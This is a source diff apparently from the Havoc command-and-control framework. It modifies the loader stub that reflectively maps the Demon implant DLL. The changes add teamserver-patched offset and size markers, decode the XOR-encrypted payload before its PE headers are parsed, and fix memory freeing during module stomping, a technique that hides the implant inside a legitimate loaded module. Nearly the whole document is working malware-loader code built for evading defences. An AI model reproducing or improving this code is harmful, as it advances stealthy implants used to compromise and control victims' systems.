@@ -17,9 +17,16 @@
 // marker the teamserver patches with the payload-encoding key at build time
 #define CRYPT_KEY_MARKER        "HAVOC_CRYPT_KEY_MARKER"
 
-WCHAR gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
-BYTE  gStompEnabled                    = STOMP_ENABLED_MARKER;
-CHAR  gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;
+// markers the teamserver overwrites with the template size (= appended DLL
+// offset) and the compiled Demon DLL size (= decode length) respectively
+#define DLL_OFFSET_MARKER       0xD11F0D11D11F0D11
+#define DLL_SIZE_MARKER         0xA22E1E22A22E1E22
+
+WCHAR   gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
+BYTE    gStompEnabled                    = STOMP_ENABLED_MARKER;
+CHAR    gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;
+ULONG64 gDllOffset                       = DLL_OFFSET_MARKER;
+ULONG64 gDllSize                         = DLL_SIZE_MARKER;
 
 SEC( text, B ) VOID Entry( VOID )
 {
@@ -42,9 +49,14 @@ SEC( text, B ) VOID Entry( VOID )
     SIZE_T                  StompSize       = 0;
     PIMAGE_NT_HEADERS       StompNt         = NULL;
 
-    // 0. First we need to get our own image base
-    KaynLibraryLdr          = KaynCaller();
-    Instance.Modules.Ntdll  = LoaderModPebbb( NTDLL_HASH );
+    // 0. Get our own base address and locate the appended Demon DLL.
+    //    GetRIP returns an address inside this stub; page-align it to find the
+    //    allocation base (the stub always starts at offset 0).  The teamserver
+    //    writes the template size into gDllOffset, so base + offset = DLL start.
+    //    This is reliable even when the DLL is encoded (no MZ to scan for).
+    ULONG_PTR stubBase    = ( ULONG_PTR ) GetRIP( ) & ~( PAGE_SIZE - 1 );
+    KaynLibraryLdr        = C_PTR( stubBase + gDllOffset );
+    Instance.Modules.Ntdll = LoaderModPebbb( NTDLL_HASH );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
     Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
@@ -52,40 +64,17 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
     Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
 
+    // Decode the appended DLL BEFORE reading any PE fields. When the
+    // teamserver encoded the payload the entire DLL region is ciphertext,
+    // including the DOS/NT headers we need below. Decode in one pass using
+    // the size the teamserver patched into gDllSize.
+    if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
+        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
+
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
-
-    // Decode the appended (XOR keystream) Demon DLL in place. the teamserver
-    // patched gCryptKey at build time; the encoded DLL directly follows this
-    // loader image in memory. the raw template size is (RawEnd - RawStart):
-    // the same offset the teamserver appends the encoded DLL at.
-    {
-        DWORD   RawSize  = 0;
-        DWORD   RawStart = SecHeader[ 0 ].PointerToRawData;
-        LPVOID  DllStart = NULL;
-        DWORD   DllSize  = 0;
-
-        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
-        {
-            DWORD End = SecHeader[ i ].PointerToRawData + SecHeader[ i ].SizeOfRawData;
-            if ( End > RawSize )
-                RawSize = End;
-        }
-        RawSize -= RawStart;
-
-        // RawSize spans header + raw sections, so KaynLibraryLdr + RawSize
-        // lands just past the appended DLL — back off by RawStart to reach it.
-        DllStart = C_PTR( KaynLibraryLdr + RawSize - RawStart );
-        DllSize  = KHdrSize + KMemSize;
-
-        // Only decode when the teamserver actually encoded the payload (it
-        // patches gCryptKey away from the default marker). When Payload Encode
-        // is off the DLL is plaintext and decoding would corrupt the image.
-        if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
-            CryptDecodeBuffer( DllStart, DllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
-    }
 
     // Optional module stomping: overwrite a legitimate, already-loaded module
     // image with our payload. enabled per-build by the teamserver (gStompEnabled).
@@ -187,8 +176,13 @@ SEC( text, B ) VOID Entry( VOID )
         // when stomping: trim the decoy's trailing pages and restore RX over the image
         if ( gStompEnabled == 1 )
         {
+            // free the decoy's tail: from end-of-image to end-of-module
             if ( StompSize > NtHeaders->OptionalHeader.SizeOfImage )
-                Instance.Win32.NtFreeVirtualMemory( NtCurrentProcess(), &KVirtualMemory, &( SIZE_T ){ StompSize - NtHeaders->OptionalHeader.SizeOfImage }, MEM_RELEASE );
+            {
+                PVOID freeBase = C_PTR( ( ULONG_PTR ) KVirtualMemory + NtHeaders->OptionalHeader.SizeOfImage );
+                SIZE_T freeSize = StompSize - NtHeaders->OptionalHeader.SizeOfImage;
+                Instance.Win32.NtFreeVirtualMemory( NtCurrentProcess(), &freeBase, &freeSize, MEM_RELEASE );
+            }
 
             SecMemory     = KVirtualMemory;
             SecMemorySize = NtHeaders->OptionalHeader.SizeOfImage;
